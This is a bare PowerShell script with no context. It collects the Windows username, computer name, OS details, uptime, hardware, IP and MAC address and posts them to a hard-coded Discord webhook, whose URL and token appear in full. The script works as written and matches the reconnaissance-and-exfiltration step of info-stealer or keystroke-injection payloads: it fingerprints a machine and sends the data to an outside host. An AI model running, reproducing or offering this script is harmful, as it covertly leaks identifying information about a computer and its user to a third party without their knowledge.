$sysInfo = @{
    Username     = $env:USERNAME
    ComputerName = $env:COMPUTERNAME
    OS           = (Get-CimInstance Win32_OperatingSystem).Caption
    OSVersion    = (Get-CimInstance Win32_OperatingSystem).Version
    Architecture = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
    Uptime       = ((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).ToString()
    CPU          = (Get-CimInstance Win32_Processor).Name
    RAM          = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB)
    IP           = (Test-Connection -ComputerName (hostname) -Count 1).IPv4Address.IPAddressToString
    MAC          = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -First 1).MacAddress
}

$message = "📡 **Systeeminformatie** `$(Get-Date)` `n"
foreach ($key in $sysInfo.Keys) {
    $message += "**$key**: $($sysInfo[$key])`n"
}

$webhookUrl = "https://discord.com/api/webhooks/1394778160842805318/hkY1HVMnKH-Lng3c8qrz9D2nDrpGKc6Zd5sadsXsMhLD7YPsylcx14By-TgKAG8S8cCt"
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{ content = $message } | ConvertTo-Json -Depth 2) -ContentType 'application/json'
